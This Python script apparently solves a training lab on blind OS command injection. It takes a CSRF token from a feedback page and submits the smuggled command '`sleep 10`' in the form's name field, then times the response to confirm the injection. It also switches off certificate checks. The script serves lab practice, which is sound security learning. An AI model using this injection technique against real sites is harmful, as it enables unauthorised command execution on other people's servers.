import requests
import re
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind OS command injection with time delays"


def run(url, payload, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False
    url = url.rstrip('/')

    print(Fore.WHITE + "[*] Fetching the feedback page", end="", flush=True)
    print()

    feedback_page = session.get(f"{url}/feedback", allow_redirects=False)

    print(Fore.WHITE +
          "[*] Extracting the csrf token and session cookie", end="", flush=True)
    print()

    csrf_token = re.findall("csrf.+value=\"(.+)\"", feedback_page.text)[0]

    print(Fore.GREEN + "csrf token" + "=>" + Fore.YELLOW + csrf_token)

    print(Fore.WHITE +
          "[*] Injecting payload to cause a delay", end="", flush=True)
    print()

    payload = "`sleep 10`"
    data = {"csrf": csrf_token, "name": payload,
            "email": "mystic_mido@gmail.com", "subject": "mystic", "message": "mido"}

    try:
        res = session.post(f"{url}/feedback/submit",
                           data=data, allow_redirects=False)
        if res.elapsed.total_seconds() >= 9:
            print(Fore.GREEN + " Delay confirmed. Lab likely solved")

        else:
            print(Fore.YELLOW + " No delay detected. Payload may have failed")
        return True

    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        return False
